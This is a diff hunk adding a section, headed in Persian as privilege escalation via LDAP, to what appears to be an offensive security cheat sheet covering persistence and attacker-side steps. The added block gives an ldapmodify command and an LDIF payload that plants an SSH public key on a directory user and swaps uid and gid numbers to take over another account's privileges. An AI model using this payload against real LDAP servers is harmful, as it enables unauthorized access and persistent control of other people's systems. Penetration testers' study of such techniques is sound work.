@@ -364,6 +364,26 @@ set-acl -path $folder -AclObject $acl
 get-acl $folder | folder
 ```
 
+### افزایش دسترسی با ldap
+
+```text
+1. exec ldapmodify -x -w PASSWORD
+2. paste this
+dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC
+changeType: modify
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: content of id_rsa.pub
+-
+replace: EVIL GROUP ID
+uidNumber: CURRENT USER ID
+-
+replace: EVIL USER ID
+gidNumber: CURRENT GROUP ID
+```
+
 ## دسترسی همیشگی
 
 ### برای لینوکس \(در سیستم مهاجم\)
